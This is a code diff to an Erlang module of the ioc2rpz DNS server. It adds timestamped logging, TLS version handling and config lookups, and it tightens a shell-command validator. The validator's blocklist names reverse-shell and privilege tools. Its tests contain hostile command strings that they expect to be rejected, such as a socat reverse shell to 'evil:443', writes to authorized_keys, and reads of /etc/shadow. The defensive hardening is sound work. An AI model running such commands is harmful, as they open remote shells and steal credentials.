@@ -15,10 +15,13 @@
 %IOC2RPZ Functions
 
 -module(ioc2rpz_fun).
--include_lib("eunit/include/eunit.hrl").
 -include_lib("ioc2rpz.hrl").
+-ifdef(TEST).
+-include_lib("eunit/include/eunit.hrl").
+-endif.
 -export([logMessage/2,logMessageCEF/2,strs_to_binary/1,curr_serial/0,curr_serial_60/0,constr_ixfr_url/3,ip_to_bin/1,read_local_actions/1,split_bin_bytes/2,split_tail/2,rsplit_tail/2,
          bin_to_lowcase/1,ip_in_list/2,intersection/2,bin_to_hexstr/1,conv_to_Mb/1,q_class/1,q_type/1,split/2,msg_CEF/1,base64url_decode/1,get_cipher_suites/1,
+         get_tls_versions/1,srv_cfg/0,srv_cert/0,
          str_to_ip/1,check_rate_limit/2,check_rate_limit/3,cleanup_rate_limit_table/0,constant_time_compare/2,json_escape/1,validate_shell_cmd/1,
          mask_new/0,mask_new/1,mask_set/2,mask_or/2,mask_bits/1,mask_from_indices/1,mask_from_indices/2,
          mask_to_bitmap/1,mask_to_integer/1,mask_repr_for/1,mask_is_empty/1]).
@@ -32,13 +35,16 @@ logMessage(Message, Vars) ->
   logMessage(group_leader(), Message, Vars).
 
 %% @doc Logs a formatted message to the specified IO destination with a timestamp prefix.
+%%
+%% The prefix ({@link log_prefix/0}) is prepended to the format string so the
+%% whole line is written by a SINGLE `io:fwrite/3' call and cannot interleave
+%% with a line written concurrently by another process.
 %% @param Dest The IO device to write to (e.g., `group_leader()').
 %% @param Message An `io:format/2' format string.
 %% @param Vars A list of arguments for the format string.
 -spec logMessage(pid() | atom(), string(), list()) -> ok.
 logMessage(Dest, Message, Vars) ->
- ?addTS(Dest),
- safe_fwrite(Dest,Message,Vars).
+ safe_fwrite(Dest,log_prefix() ++ Message,Vars).
 
 
 %% @doc Logs a CEF (Common Event Format) message to the group leader.
@@ -52,8 +58,55 @@ logMessageCEF(Message, Vars) -> % "Device Event Class ID|Name|Severity|[Extensio
   logMessageCEF(group_leader(), Message, Vars).
 
 logMessageCEF(Dest, Message, Vars) ->
- ?addTS(Dest),
- safe_fwrite(Dest,"CEF:0|ioc2rpz|ioc2rpz|~s"++Message,[?ioc2rpz_ver|Vars]).
+ safe_fwrite(Dest,log_prefix() ++ "CEF:0|ioc2rpz|ioc2rpz|~s" ++ Message,[?ioc2rpz_ver|Vars]).
+
+%% @doc Returns the per-line log prefix: a local timestamp with millisecond
+%% resolution and (optionally) the pid of the logging process.
+%%
+%% "2026-09-21 21:24:45.296 &lt;0.3418864.0&gt; "
+%%
+%% Controlled at compile time by `?logTS' and `?logPID' (include/ioc2rpz.hrl);
+%% with both undefined it returns `""' and logging is byte-for-byte as before.
+%% The result contains no `~', so it is safe to concatenate in front of an
+%% `io:format/2' format string - which is how the caller keeps the line atomic.
+%% @returns A prefix string, possibly empty.
+-spec log_prefix() -> string().
+-ifdef(logTS).
+log_prefix() ->
+  %% Wall clock, not erlang:monotonic_time: this is an event time for operators
+  %% and SIEMs. system_time is split rather than taking calendar:local_time/0 so
+  %% the seconds and the milliseconds come from the same reading.
+  MS = erlang:system_time(millisecond),
+  {{Y,M,D},{HH,MM,SS}} = calendar:system_time_to_local_time(MS, millisecond),
+  %% Assembled by hand rather than with io_lib:format/2 + lists:flatten/1: this
+  %% runs for every log line, including the CEF 202 written for every DNS query,
+  %% and the format-based version measured 2.8x slower (3.9 vs 1.4 us/line).
+  %% lists:append/1 (not nested ++) so the pieces are walked once and the result
+  %% is a flat string - a deep list is not a valid io:fwrite/3 format string.
+  lists:append([integer_to_list(Y),"-",pad2(M),"-",pad2(D)," ",
+                pad2(HH),":",pad2(MM),":",pad2(SS),".",pad3(MS rem 1000)," ",log_pid()]).
+-else.
+log_prefix() -> log_pid().
+-endif.
+
+%% @doc The pid part of {@link log_prefix/0}: "&lt;0.1234.0&gt; " or `""'.
+-spec log_pid() -> string().
+-ifdef(logPID).
+log_pid() -> pid_to_list(self()) ++ " ".
+-else.
+log_pid() -> "".
+-endif.
+
+%% @doc Zero-pads a 0..99 value to 2 characters (`"~2..0w"' by hand).
+-spec pad2(non_neg_integer()) -> string().
+pad2(N) when N < 10 -> [$0,$0+N];
+pad2(N) -> integer_to_list(N).
+
+%% @doc Zero-pads a 0..999 value to 3 characters (`"~3..0w"' by hand).
+-spec pad3(non_neg_integer()) -> string().
+pad3(N) when N < 10 -> [$0,$0,$0+N];
+pad3(N) when N < 100 -> [$0|integer_to_list(N)];
+pad3(N) -> integer_to_list(N).
 
 %% @doc Writes a formatted log line, but never lets a logging error crash the
 %% calling process. A format string / argument-count mismatch (or any other
@@ -483,6 +536,73 @@ get_cipher_suites(TLSVersion) ->
   logMessage("unsupported TLS version ~p, falling back to tlsv1.2~n", [TLSVersion]),
   ssl:cipher_suites(default, 'tlsv1.2').
 
+%% @doc Expands the configured `?TLSVersion' into the list of protocol versions
+%% for the `{versions, [...]}' option of `ssl:listen/2' / `cowboy:start_tls/3'.
+%%
+%% Without this the setting only selected cipher suites, which left the accepted
+%% protocol versions at the ssl application's defaults: whether an unwanted
+%% version was actually refused depended on there being no cipher suite in
+%% common, not on configuration. Passing the versions explicitly makes the
+%% setting authoritative during handshake negotiation.
+%%
+%% An unrecognised value falls back to TLS 1.2 with a warning, matching
+%% {@link get_cipher_suites/1} so the two options can never disagree.
+%%
+%% @param TLSVersion `'tlsv1.2-1.3'', `'tlsv1.2'', `'tlsv1.3'', `'tlsv1.1'' or `'dtlsv1.2''.
+%% @returns A list of ssl version atoms.
+-spec get_tls_versions(atom()) -> [atom()].
+get_tls_versions('tlsv1.2-1.3') ->
+  ['tlsv1.2','tlsv1.3'];
+
+get_tls_versions(TLSVersion) when TLSVersion=='tlsv1.2';TLSVersion=='tlsv1.3';TLSVersion=='tlsv1.1';TLSVersion=='dtlsv1.2' ->
+  [TLSVersion];
+
+get_tls_versions(TLSVersion) ->
+  logMessage("unsupported TLS version ~p, falling back to tlsv1.2~n", [TLSVersion]),
+  ['tlsv1.2'].
+
+%% @doc Reads the server configuration row from `cfg_table'.
+%%
+%% The row is a 7-tuple `{srv, Server, Email, MKeys, ACL, Cert, #srv{}}' inserted
+%% by {@link ioc2rpz_sup:read_config3/1}. Callers used to destructure it with a
+%% hard `[[...]] = ets:match(cfg_table,{srv,...})', which raised `badmatch' when
+%% the row was absent — crashing the process that happened to need it (the
+%% supervisor during startup, a DNS/DoT connection worker, or a REST request).
+%% Returning a tagged tuple lets each caller degrade gracefully instead.
+%%
+%% `cfg_table' is an `ordered_set' keyed on the atom `srv', so at most one such
+%% row can exist; the only failure mode is a missing row (no `srv' entry in the
+%% configuration file, or a read that races a reload).
+%%
+%% @returns `{ok, {Server, Email, MKeys, ACL, Cert, Srv}}' or
+%%          `{error, no_srv_config}'.
+-spec srv_cfg() -> {ok, {binary(), binary(), list(), list(), term(), term()}} | {error, no_srv_config}.
+srv_cfg() ->
+  try ets:lookup(cfg_table, srv) of
+    [{srv,Server,Email,MKeys,ACL,Cert,Srv}] ->
+      {ok, {Server,Email,MKeys,ACL,Cert,Srv}};
+    _ ->
+      {error, no_srv_config}
+  catch
+    %% cfg_table itself may not exist yet (or may have been deleted during a
+    %% shutdown race) - treat that like a missing row rather than crashing.
+    _:_ -> {error, no_srv_config}
+  end.
+
+%% @doc Reads the configured TLS certificate (`#cert{}') from `cfg_table'.
+%% @returns `{ok, Cert}' when a certificate is configured, `{error, no_cert}'
+%%          when the server row exists but has none, or `{error, no_srv_config}'.
+-spec srv_cert() -> {ok, term()} | {error, no_cert | no_srv_config}.
+srv_cert() ->
+  case srv_cfg() of
+    {ok, {_Server,_Email,_MKeys,_ACL,Cert,_Srv}} when Cert /= [], Cert /= undefined ->
+      {ok, Cert};
+    {ok, _} ->
+      {error, no_cert};
+    {error, Reason} ->
+      {error, Reason}
+  end.
+
 %%%Rate limiting functions
 %%
 %% Rate limit state lives in the `?RATE_LIMIT_TABLE' ETS table as
@@ -681,16 +801,73 @@ validate_shell_cmd(CMD) when is_binary(CMD) ->
       end
   end.
 
-%% @doc Blocklist of destructive commands / shells, matched by basename.
+%% @doc Blocklist of commands rejected by basename, whether they are invoked
+%% bare or through an absolute path.
+%%
+%% Grouped by what they would give an attacker who can influence a `shell:'
+%% source. The absolute-path escape hatch (see {@link validate_shell_executable/1})
+%% means a blocklist entry is the ONLY thing standing between a command and
+%% execution, so this list covers the escalation primitives, not just obviously
+%% destructive commands:
+%%
+%% <ul>
+%%   <li>destructive / filesystem-mutating: rm, mkfs, dd, chmod, chown, mv, cp,
+%%       ln, install, truncate, shred, rsync, mkfifo, mknod</li>
+%%   <li>arbitrary write from a read-only-looking pipeline: tee (previously on
+%%       the safe-utility allowlist, which made `... | tee /root/.ssh/authorized_keys'
+%%       pass while plain `>' redirection was correctly rejected)</li>
+%%   <li>process/host control: kill, killall, pkill, shutdown, reboot, halt,
+%%       poweroff, systemctl, service</li>
+%%   <li>shells and shell builtins that re-enter a shell: bash, sh, zsh, csh,
+%%       ksh, dash, ash, busybox, eval, exec, source, command</li>
+%%   <li>command launchers / arbitrary-exec wrappers: xargs, find (`-exec',
+%%       `-delete'), env, nohup, setsid, sudo, su, doas, ssh, scp, sftp, at,
+%%       batch, crontab</li>
+%%   <li>network listeners / reverse shells: nc, ncat, netcat, socat, telnet</li>
+%% </ul>
+%%
+%% NOT blocked, deliberately: general-purpose interpreters (php, python, perl,
+%% ruby, node, ...). Invoking a local decoder script through its interpreter by
+%% absolute path — `/usr/bin/php /opt/ioc2rpz/cfg/decoder.php' — is a supported
+%% and documented way to write a `shell:' source, so blocking them would break
+%% working configurations. The consequence is that an interpreter's inline-code
+%% flag (`/usr/bin/python3 -c ...') is still accepted, i.e. anyone who can write
+%% the configuration file can run arbitrary code. That is inherent to `shell:'
+%% and to a trusted configuration; this validation reduces the blast radius of a
+%% mistake or a partially-controlled config value, it is not a sandbox.
 shell_blocked_cmds() ->
-  ["rm","mkfs","dd","chmod","chown","shutdown","reboot","kill","killall",
-   "mv","eval","exec","source","bash","sh","zsh","csh","ksh"].
+  %% destructive / filesystem-mutating
+  ["rm","mkfs","dd","chmod","chown","chgrp","mv","cp","ln","install",
+   "truncate","shred","rsync","mkfifo","mknod","tee",
+  %% process / host control
+   "kill","killall","pkill","shutdown","reboot","halt","poweroff",
+   "systemctl","service",
+  %% shells and shell re-entry
+   "bash","sh","zsh","csh","ksh","dash","ash","busybox",
+   "eval","exec","source","command",
+  %% command launchers / arbitrary-exec wrappers
+   "xargs","find","env","nohup","setsid",
+   "at","batch","crontab","sudo","su","doas","ssh","scp","sftp",
+  %% network listeners / reverse shells
+   "nc","ncat","netcat","socat","telnet"].
 
-%% @doc Allowlist of safe text-processing utilities that may be invoked by bare
-%% name (without an absolute path), matched by basename.
+%% @doc Allowlist of safe utilities that may be invoked by bare name (without an
+%% absolute path), matched by basename.
+%%
+%% Deliberately limited to read/transform tools that write only to stdout. Note
+%% that `sed' and `awk' can still write files through their own expression
+%% language (`sed -i', awk's `print > "file"'); constraining that would require
+%% parsing their arguments, which is out of scope. `shell:' remains a
+%% trusted-configuration feature: this validation is defence-in-depth against
+%% mistakes and against a compromised config source, not a sandbox.
+%% `tee' was removed from this list (and added to the blocklist): it made
+%% `... | tee /root/.ssh/authorized_keys' pass while plain `>' redirection was
+%% correctly rejected, i.e. it was an arbitrary-file-write primitive sitting on
+%% the "safe utility" allowlist. Nothing else changed, so every previously valid
+%% command that did not use `tee' still validates.
 shell_safe_utils() ->
   ["sort","uniq","grep","egrep","fgrep","sed","awk","gawk","cut","tr",
-   "head","tail","cat","comm","wc","tee"].
+   "head","tail","cat","comm","wc"].
 
 %% @doc Quote-aware scanner. Splits the command into segments on any unquoted
 %% command separator (`|', `;', `&', newline, carriage-return) and rejects
@@ -767,6 +944,13 @@ validate_shell_segments_1([Seg | Rest]) ->
   end.
 
 %% @doc Validates a single executable token against the blocklist/allowlist.
+%%
+%% The blocklist is checked FIRST and by basename, so it applies to absolute
+%% paths as well as bare names and the allowlist can never re-admit a blocked
+%% command. An absolute path that survives the blocklist is accepted: writing a
+%% full path in the configuration is taken as explicit operator intent (it is how
+%% site-specific feed scripts are invoked). A bare name must be on the
+%% safe-utility allowlist.
 validate_shell_executable(Exe) ->
   Base = filename:basename(Exe),
   case lists:member(Base, shell_blocked_cmds()) of
@@ -966,6 +1150,11 @@ le_bytes_to_int(<<Byte, Rest/binary>>) -> Byte bor (le_bytes_to_int(Rest) bsl 8)
 %%%%
 %%%% EUnit tests
 %%%%
+%%%% Compiled only when TEST is defined (rebar3 eunit / rebar3 as test), so test
+%%%% code and its exports stay out of release beams. Several of these tests
+%%%% create and delete named ETS tables that the running server owns.
+%%%%
+-ifdef(TEST).
 q_class_test() -> [
 	?assert(q_class(?C_IN) =:= "IN"),
 	?assert(q_class(42) =:= "42")
@@ -1160,7 +1349,25 @@ validate_shell_cmd_test() -> [
 	%% chaining two allowed absolute commands with `;' is accepted (each validated)
 	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s http://a.example ; /usr/bin/curl -s http://b.example">>)),
 	%% separators inside quotes are literal, not separators
-	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s 'https://example.com/feed?a=1&b=2;c=3'">>))
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s 'https://example.com/feed?a=1&b=2;c=3'">>)),
+	%% --- `tee' is no longer a "safe utility": it was an arbitrary-file-write
+	%% primitive on the allowlist, so a read-only-looking pipeline could write any
+	%% file even though plain `>' redirection was rejected ---
+	?assertMatch({error, {blocked_command, "tee"}}, validate_shell_cmd(<<"/usr/bin/curl -s http://example.com | tee /root/.ssh/authorized_keys">>)),
+	?assertMatch({error, {blocked_command, "tee"}}, validate_shell_cmd(<<"/usr/bin/curl -s http://example.com | /usr/bin/tee /etc/passwd">>)),
+	%% --- absolute-path escalation vectors are now blocked by basename ---
+	?assertMatch({error, {blocked_command, "find"}}, validate_shell_cmd(<<"/usr/bin/find /var -name '*.log' -delete">>)),
+	?assertMatch({error, {blocked_command, "xargs"}}, validate_shell_cmd(<<"/usr/bin/curl -s http://example.com | /usr/bin/xargs /bin/rm">>)),
+	?assertMatch({error, {blocked_command, "nc"}}, validate_shell_cmd(<<"/usr/bin/nc -l 4444">>)),
+	?assertMatch({error, {blocked_command, "socat"}}, validate_shell_cmd(<<"/usr/bin/socat TCP:evil:443 EXEC:/bin/sh">>)),
+	?assertMatch({error, {blocked_command, "cp"}}, validate_shell_cmd(<<"/bin/cp /etc/shadow /tmp/x">>)),
+	?assertMatch({error, {blocked_command, "sudo"}}, validate_shell_cmd(<<"/usr/bin/sudo /bin/cat /etc/shadow">>)),
+	?assertMatch({error, {blocked_command, "ssh"}}, validate_shell_cmd(<<"/usr/bin/ssh evil@host">>)),
+	?assertMatch({error, {blocked_command, "env"}}, validate_shell_cmd(<<"/usr/bin/env /bin/sh">>)),
+	%% --- interpreters remain allowed by absolute path: running a local decoder
+	%% script is a documented way to write a shell: source (see the php pipeline
+	%% above), so blocking them would break working configurations ---
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/python3 /opt/ioc2rpz/cfg/decoder.py">>))
 ].
 
 %% Verifies the source-attribution mask abstraction (IOC Source Attribution,
@@ -1321,3 +1528,5 @@ mask_is_empty_bitmap_test() -> [
 	?assert(not mask_is_empty(mask_set(mask_new(bitmap), 100))),
 	?assert(not mask_is_empty(mask_set(mask_new(bitmap), 64)))
 ].
+
+-endif.
